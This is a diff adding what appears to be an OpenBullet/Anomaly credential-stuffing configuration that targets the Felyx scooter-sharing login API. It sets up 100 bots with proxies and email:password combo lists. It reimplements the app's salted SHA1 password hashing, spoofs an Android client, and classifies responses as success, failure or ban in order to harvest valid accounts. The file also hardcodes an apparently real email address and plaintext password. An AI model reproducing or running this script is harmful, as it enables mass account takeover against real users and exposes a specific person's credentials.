@@ -1,0 +1,110 @@
+[SETTINGS]
+{
+  "Name": "Felyx",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-08T09:41:54.9776394+02:00",
+  "AdditionalInfo": "",
+  "Author": "Dedrilath",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Hash SHA1 "r8UY7jvUVukMsVNENfGZDUaWnzBQccGx<PASS>" -> VAR "1" 
+
+FUNCTION Hash SHA1 "mHeWYBzWQ6dHshrmUJF7HKRMoRpwoMWj<1>" -> VAR "2" 
+
+FUNCTION Hash SHA1 "JZWsFxFv9frtVgLYUwPahTVG4WGyYLZW<2>" -> VAR "1" 
+
+FUNCTION Hash SHA1 "aVFGGdUx3Rt2rUYVyEDBFrvdKkFgaiMZ<USER><1>" -> VAR "2" 
+
+FUNCTION Base64Encode "<USER>:<2>" -> VAR "basic" 
+
+REQUEST GET "https://felyx.frontend.fleetbird.eu/api/prod/v1.0/login" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "http.useragent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G930K Build/NRD90M)" 
+  HEADER "Authorization: Basic <basic>" 
+  HEADER "Content-Length: 35" 
+  HEADER "Host: felyx.frontend.fleetbird.eu" 
+  HEADER "Connection: Keep-Alive" 
+
+PARSE "<SOURCE>" JSON "userId" -> VAR "S1" 
+
+FUNCTION Replace "<S1>" "SUCCESS" "<S1>" -> VAR "S" 
+
+PARSE "<SOURCE>" LR "{\"code\":10002,\"error\":\"unauthorized, " "\",\"" -> VAR "T" 
+
+FUNCTION Replace "<T>" "FAIL" "<T>" -> VAR "F" 
+
+FUNCTION Hash SHA1 "r8UY7jvUVukMsVNENfGZDUaWnzBQccGxLijpemocro66" -> VAR "1" 
+
+FUNCTION Hash SHA1 "mHeWYBzWQ6dHshrmUJF7HKRMoRpwoMWj<1>" -> VAR "2" 
+
+FUNCTION Hash SHA1 "JZWsFxFv9frtVgLYUwPahTVG4WGyYLZW<2>" -> VAR "1" 
+
+FUNCTION Hash SHA1 "aVFGGdUx3Rt2rUYVyEDBFrvdKkFgaiMZramadanabdulmoati@gmail.com<1>" -> VAR "2" 
+
+FUNCTION Base64Encode "ramadanabdulmoati@gmail.com:<2>" -> VAR "basic" 
+
+REQUEST GET "https://felyx.frontend.fleetbird.eu/api/prod/v1.0/login" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "http.useragent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G930K Build/NRD90M)" 
+  HEADER "Authorization: Basic <basic>" 
+  HEADER "Content-Length: 35" 
+  HEADER "Host: felyx.frontend.fleetbird.eu" 
+  HEADER "Connection: Keep-Alive" 
+
+PARSE "<SOURCE>" LR "{\"code\":10002,\"error\":\"unauthorized, " "\",\"" -> VAR "B1" 
+
+FUNCTION Replace "<B1>" "BAN" "<B1>" -> VAR "B" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<F>" Contains "FAIL" 
+  KEYCHAIN Success OR 
+    KEY "<S>" Contains "SUCCESS" 
+  KEYCHAIN Ban OR 
+    KEY "<B>" Contains "BAN" 
+
